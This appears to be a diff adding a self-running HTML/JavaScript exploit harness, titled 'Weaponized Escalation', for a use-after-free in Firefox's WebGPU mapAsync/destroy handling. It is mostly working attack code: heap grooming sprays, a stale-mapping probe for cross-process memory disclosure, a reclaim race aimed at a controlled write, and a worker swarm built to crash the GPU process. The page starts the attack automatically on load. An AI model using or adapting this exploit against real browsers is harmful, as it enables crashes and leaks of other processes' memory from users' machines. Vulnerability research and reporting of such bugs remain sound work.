@@ -1,0 +1,337 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>WebGPU mapAsync/destroy UAF — Weaponized Escalation — sn0x</title>
+<style>
+  body { font: 13px/1.55 ui-monospace,monospace; background:#0b0b0b; color:#cfcfcf; margin:18px; }
+  h1 { color:#ffd24d; font-size:15px; margin:0 0 4px; }
+  h2 { color:#6cf; font-size:13px; margin:14px 0 4px; border-bottom:1px solid #222; }
+  .ok{color:#4ade80} .crit{color:#ff4d4d;font-weight:bold} .warn{color:#fbbf24} .info{color:#60a5fa} .dim{color:#777}
+  #log{white-space:pre-wrap;border:1px solid #222;padding:10px;max-height:70vh;overflow:auto;background:#070707}
+  button{background:#1a1a1a;color:#ddd;border:1px solid #333;padding:6px 12px;cursor:pointer;margin:2px}
+  button:hover{background:#252525}
+</style>
+
+<h1>WebGPU mapAsync()/destroy() UAF — Weaponized Escalation Harness</h1>
+<p class="dim">DoS → heap groom → reclaim → cross-process memory-disclosure probe. Run in Firefox with
+<code>dom.webgpu.enabled=true</code>, <code>dom.webgpu.workers.enabled=true</code>.
+Best evidence under an ASAN/debug build (run via <code>run_exploit.py</code>).</p>
+
+<div>
+  <button onclick="runAll()">RUN FULL ESCALATION</button>
+  <button onclick="STAGE.leak()">Stage 3: Info-leak only</button>
+  <button onclick="STAGE.reclaim()">Stage 4: Reclaim race</button>
+  <button onclick="STAGE.swarm()">Stage 5: Worker swarm (crash)</button>
+  <button onclick="document.getElementById('log').innerHTML=''">clear</button>
+</div>
+
+<div id="log"></div>
+
+<script>
+// ─────────────────────────────────────────────────────────────────────────────
+// Logging
+// ─────────────────────────────────────────────────────────────────────────────
+const logEl = document.getElementById('log');
+const L  = (m,c='')=>{ logEl.innerHTML += `<span class="${c}">${m}\n</span>`; logEl.scrollTop=logEl.scrollHeight; };
+const ok  =m=>L('[OK]   '+m,'ok');
+const crit=m=>L('[CRIT] '+m,'crit');
+const warn=m=>L('[WARN] '+m,'warn');
+const info=m=>L('[INFO] '+m,'info');
+const dim =m=>L(m,'dim');
+const hex =(u8,n=32)=>Array.from(u8.slice(0,n)).map(b=>b.toString(16).padStart(2,'0')).join(' ');
+
+// Marker constants for grooming / reclaim detection
+const SPRAY_MARKER   = 0x41;          // 'A' — fills groom buffers
+const RECLAIM_MARKER = 0xCC;          // fills reclaim buffers
+const TARGET_SIZE    = 4096;          // freed object size we groom around
+const SPRAY_COUNT    = 64;            // groom + reclaim spray depth
+
+// Exfil endpoint (optional; harness reads window.__RESULTS__ instead)
+function reportResult(tag, obj){
+  window.__RESULTS__ = window.__RESULTS__ || [];
+  window.__RESULTS__.push({tag, ...obj, t: performance.now()});
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Device helper
+// ─────────────────────────────────────────────────────────────────────────────
+async function newDevice(label){
+  const adapter = await navigator.gpu.requestAdapter({powerPreference:'high-performance'});
+  if(!adapter) throw new Error('no adapter');
+  const device = await adapter.requestDevice();
+  device.addEventListener('uncapturederror', e=>{
+    info(`  [${label}] uncapturederror: ${e.error?.constructor?.name} — ${e.error?.message}`);
+  });
+  device.lost.then(d=>{
+    warn(`  [${label}] device.lost: reason=${d.reason} msg=${d.message}`);
+    reportResult('device-lost',{label,reason:d.reason,message:d.message});
+  });
+  return {adapter, device};
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// STAGE 1 — Confirm the primitive (baseline crash trigger, single buffer)
+// ─────────────────────────────────────────────────────────────────────────────
+async function stage1_primitive(){
+  L('');
+  info('=== STAGE 1: Confirm UAF primitive (mapAsync in-flight + destroy) ===');
+  const {device} = await newDevice('S1');
+  const buf = device.createBuffer({
+    size: TARGET_SIZE,
+    usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
+  });
+  const mapProm = buf.mapAsync(GPUMapMode.READ);   // IPC in flight
+  device.destroy();                                 // frees backing in GPU process
+  info('  mapAsync() in flight; device.destroy() issued (no await between).');
+
+  const r = await Promise.race([
+    mapProm.then(()=>'resolved').catch(e=>'rejected:'+e.name),
+    new Promise(res=>setTimeout(()=>res('TIMEOUT'),2500)),
+  ]);
+  if(r==='resolved'){
+    crit('  mapAsync RESOLVED after device.destroy() — operation completed on a destroyed device.');
+    crit('  This is the UAF window: GPU-process map-completion ran post-free.');
+    reportResult('stage1',{outcome:'resolved-after-destroy'});
+  } else if(r==='TIMEOUT'){
+    warn('  mapAsync never settled (>2.5s) — pending GPU IPC stranded (DoS path).');
+    reportResult('stage1',{outcome:'stranded'});
+  } else {
+    ok(`  mapAsync ${r} — spec-correct rejection on this build for the single-buffer case.`);
+    reportResult('stage1',{outcome:r});
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// STAGE 2 — Heap groom: spray same-size mapped buffers w/ marker pattern
+//           Returns the groom pool so later stages can re-map / inspect.
+// ─────────────────────────────────────────────────────────────────────────────
+async function stage2_groom(device){
+  L('');
+  info(`=== STAGE 2: Heap groom (${SPRAY_COUNT} × ${TARGET_SIZE}B mapped-at-creation) ===`);
+  const pool=[];
+  for(let i=0;i<SPRAY_COUNT;i++){
+    const b = device.createBuffer({
+      size: TARGET_SIZE,
+      usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
+      mappedAtCreation: true,
+    });
+    const v = new Uint8Array(b.getMappedRange());
+    v.fill(SPRAY_MARKER);                 // 0x41 pattern → deterministic slot contents
+    // tag first 4 bytes with index so we can identify which spray landed
+    v[0]=0xDE; v[1]=0xAD; v[2]=(i>>8)&0xff; v[3]=i&0xff;
+    b.unmap();                            // returns staging to the GPU-process free pool
+    pool.push(b);
+  }
+  ok(`  Sprayed ${pool.length} buffers. Free pool now seeded with 0x41 pages tagged DEAD+idx.`);
+  return pool;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// STAGE 3 — Info-leak probe: hold a mapped ArrayBuffer, free the device,
+//           then read the stale range. If it changed from our written pattern,
+//           GPU-process reused/overwrote the shmem → cross-process disclosure.
+// ─────────────────────────────────────────────────────────────────────────────
+async function stage3_leak(){
+  L('');
+  info('=== STAGE 3: Stale mapped-range info-leak probe ===');
+  const {device} = await newDevice('S3');
+
+  // Buffer mapped at creation; we OWN a live ArrayBuffer into its shmem.
+  const buf = device.createBuffer({
+    size: TARGET_SIZE,
+    usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
+    mappedAtCreation: true,
+  });
+  const range = buf.getMappedRange();
+  const view  = new Uint8Array(range);
+  view.fill(0x5A);                        // our known pre-free contents ('Z')
+  const before = hex(view);
+  info(`  Pre-free contents (0x5A expected): ${before}`);
+
+  // Destroy device WITHOUT unmap → GPU process drops Buffer + frees staging,
+  // but content-process ArrayBuffer "range" may still alias that shmem page.
+  device.destroy();
+  info('  device.destroy() with buffer still mapped (no unmap).');
+
+  // Force GPU-process allocator churn so the freed page is likely reused:
+  // open a fresh device and spray, which should reclaim the just-freed shmem.
+  try{
+    const {device:d2} = await newDevice('S3-churn');
+    for(let i=0;i<SPRAY_COUNT;i++){
+      const b=d2.createBuffer({size:TARGET_SIZE,usage:GPUBufferUsage.MAP_WRITE|GPUBufferUsage.COPY_SRC,mappedAtCreation:true});
+      new Uint8Array(b.getMappedRange()).fill(RECLAIM_MARKER); // 0xCC reclaim pattern
+      b.unmap();
+    }
+    info('  Reclaim spray (0xCC) issued on fresh device.');
+  }catch(e){ warn('  churn device failed: '+e.message); }
+
+  await new Promise(r=>setTimeout(r,150));
+
+  // Read the STALE range again. Three outcomes:
+  let after;
+  try{
+    after = new Uint8Array(range);
+  }catch(e){
+    ok(`  Stale ArrayBuffer detached safely after free (${e.name}) — no UAF read on this build.`);
+    reportResult('stage3',{outcome:'detached'});
+    return;
+  }
+  const afterHex = hex(after);
+  const allZ  = after.every(b=>b===0x5A);
+  const anyCC = Array.from(after.slice(0,256)).some(b=>b===RECLAIM_MARKER);
+  const allZero = after.every(b=>b===0);
+
+  info(`  Post-free contents:               ${afterHex}`);
+  if(allZero){
+    ok('  Range zeroed after free — backing returned to OS / scrubbed. No disclosure.');
+    reportResult('stage3',{outcome:'zeroed'});
+  } else if(anyCC){
+    crit('  STALE RANGE NOW CONTAINS 0xCC RECLAIM MARKER — freed shmem was reused by a');
+    crit('  DIFFERENT buffer and is STILL READABLE through the old mapping.');
+    crit('  => Use-after-free READ across allocations = cross-process memory disclosure primitive.');
+    reportResult('stage3',{outcome:'UAF-READ-RECLAIM',sample:afterHex});
+  } else if(allZ){
+    warn('  Range unchanged (0x5A) — mapping still valid post-destroy (lifetime bug, no churn hit).');
+    reportResult('stage3',{outcome:'still-mapped'});
+  } else {
+    crit('  STALE RANGE HOLDS UNKNOWN NON-ZERO BYTES (not our pattern, not reclaim spray):');
+    crit('  => reading GPU-process heap contents we never wrote = HEAP DISCLOSURE.');
+    crit('  Dump: '+afterHex);
+    reportResult('stage3',{outcome:'UAF-READ-HEAP',sample:afterHex});
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// STAGE 4 — Reclaim race: free under a pending map, immediately reclaim the slot,
+//           then let the stranded map-completion write into the reclaimed object.
+//           A write landing in a reclaimed buffer = controlled corruption.
+// ─────────────────────────────────────────────────────────────────────────────
+async function stage4_reclaim(){
+  L('');
+  info('=== STAGE 4: Reclaim-and-corrupt race ===');
+  const {device} = await newDevice('S4');
+
+  await stage2_groom(device);             // seed free pool
+
+  // Victim buffer: MAP_READ, start async map, then free via destroy.
+  const victim = device.createBuffer({size:TARGET_SIZE,usage:GPUBufferUsage.MAP_READ|GPUBufferUsage.COPY_DST});
+  const mapProm = victim.mapAsync(GPUMapMode.READ);
+
+  // Free immediately
+  device.destroy();
+
+  // Reclaim spray on a NEW device, same size, 0xCC pattern, ASAP to win the race.
+  const {device:d2} = await newDevice('S4-reclaim');
+  const reclaimed=[];
+  for(let i=0;i<SPRAY_COUNT;i++){
+    const b=d2.createBuffer({size:TARGET_SIZE,usage:GPUBufferUsage.MAP_WRITE|GPUBufferUsage.COPY_SRC,mappedAtCreation:true});
+    new Uint8Array(b.getMappedRange()).fill(RECLAIM_MARKER);
+    b.unmap();
+    reclaimed.push(b);
+  }
+  info('  Reclaim spray issued; awaiting stranded victim map-completion…');
+
+  const r = await Promise.race([
+    mapProm.then(()=>'resolved').catch(e=>'rejected:'+e.name),
+    new Promise(res=>setTimeout(()=>res('TIMEOUT'),2500)),
+  ]);
+  info('  victim mapProm => '+r);
+
+  if(r==='resolved'){
+    crit('  Stranded map completed AFTER free+reclaim. The GPU-process map handler wrote');
+    crit('  into memory that now belongs to a reclaimed buffer => controlled UAF write window.');
+    // Try to read victim range — would expose reclaim/heap data if mapping survived.
+    try{
+      const u=new Uint8Array(victim.getMappedRange());
+      crit('  victim.getMappedRange() post-reclaim: '+hex(u));
+      reportResult('stage4',{outcome:'map-completed-after-reclaim',sample:hex(u)});
+    }catch(e){ warn('  getMappedRange threw: '+e.name); reportResult('stage4',{outcome:'completed-no-range'}); }
+  } else {
+    ok('  Race not won this pass ('+r+'). Re-run; reclaim races are layout-dependent.');
+    reportResult('stage4',{outcome:r});
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// STAGE 5 — Worker swarm: N parallel workers each running the minimal trigger.
+//           Parallelism wins the race reliably and maximizes GPU-process crash
+//           probability (report-grade DoS + best chance to hit the UAF window).
+// ─────────────────────────────────────────────────────────────────────────────
+function workerSrc(){
+  return `
+  self.onmessage = async () => {
+    try{
+      const adapter = await navigator.gpu.requestAdapter();
+      const device  = await adapter.requestDevice();
+      // tight loop: race map + destroy repeatedly to amplify the window
+      for(let i=0;i<8;i++){
+        const buf = device.createBuffer({size:${TARGET_SIZE},
+          usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST});
+        const p = buf.mapAsync(GPUMapMode.READ);
+        device.destroy();
+        try{ await p; }catch(e){}
+        // device destroyed; request a fresh one for next iteration
+        const a2 = await navigator.gpu.requestAdapter();
+        if(!a2) break;
+        Object.defineProperty(self,'_d',{value:await a2.requestDevice(),configurable:true});
+      }
+      self.postMessage({done:true});
+    }catch(e){ self.postMessage({error:String(e)}); }
+  };`;
+}
+
+async function stage5_swarm(){
+  L('');
+  info('=== STAGE 5: Worker swarm (parallel race → GPU-process crash) ===');
+  const N = 6;
+  const url = URL.createObjectURL(new Blob([workerSrc()],{type:'application/javascript'}));
+  const workers=[];
+  let done=0, errs=0;
+  const start=performance.now();
+  const result = await new Promise(resolve=>{
+    const to=setTimeout(()=>resolve('TIMEOUT'),8000);
+    for(let i=0;i<N;i++){
+      const w=new Worker(url);
+      w.onmessage=e=>{
+        if(e.data.error){ errs++; } else { done++; }
+        if(done+errs>=N){ clearTimeout(to); resolve('all-returned'); }
+      };
+      w.onerror=()=>{ errs++; };
+      w.postMessage('go');
+      workers.push(w);
+    }
+  });
+  const dt=((performance.now()-start)/1000).toFixed(2);
+  workers.forEach(w=>w.terminate()); URL.revokeObjectURL(url);
+  if(result==='TIMEOUT'){
+    crit(`  Swarm hung >8s (${done} done / ${errs} err of ${N}) — GPU process wedged or crashed.`);
+    crit('  If the TAB itself crashed, you are seeing this in the next run only — check launcher log.');
+    reportResult('stage5',{outcome:'wedged',done,errs});
+  } else {
+    ok(`  Swarm returned in ${dt}s (${done} done / ${errs} err). No tab crash THIS pass — re-run to amplify.`);
+    reportResult('stage5',{outcome:'returned',done,errs,dt});
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Orchestration
+// ─────────────────────────────────────────────────────────────────────────────
+const STAGE = { leak:stage3_leak, reclaim:stage4_reclaim, swarm:stage5_swarm };
+
+async function runAll(){
+  window.__RESULTS__=[];
+  if(!navigator.gpu){ warn('navigator.gpu undefined — enable dom.webgpu.enabled.'); return; }
+  info('UA: '+navigator.userAgent);
+  try{ await stage1_primitive(); }catch(e){ warn('S1 fatal: '+e.message); }
+  try{ await stage3_leak();      }catch(e){ warn('S3 fatal: '+e.message); }
+  try{ await stage4_reclaim();   }catch(e){ warn('S4 fatal: '+e.message); }
+  try{ await stage5_swarm();     }catch(e){ warn('S5 fatal: '+e.message); }
+  L('');
+  info('=== COMPLETE ===');
+  info('Any [CRIT] line that mentions UAF-READ / map-completed-after-reclaim is the escalation.');
+  info('window.__RESULTS__ holds machine-readable outcomes for the launcher.');
+  window.__DONE__ = true;
+}
+
+// Auto-run when opened directly (launcher also calls runAll()).
+if(location.hash !== '#manual') window.addEventListener('load',()=>setTimeout(runAll,200));
+</script>
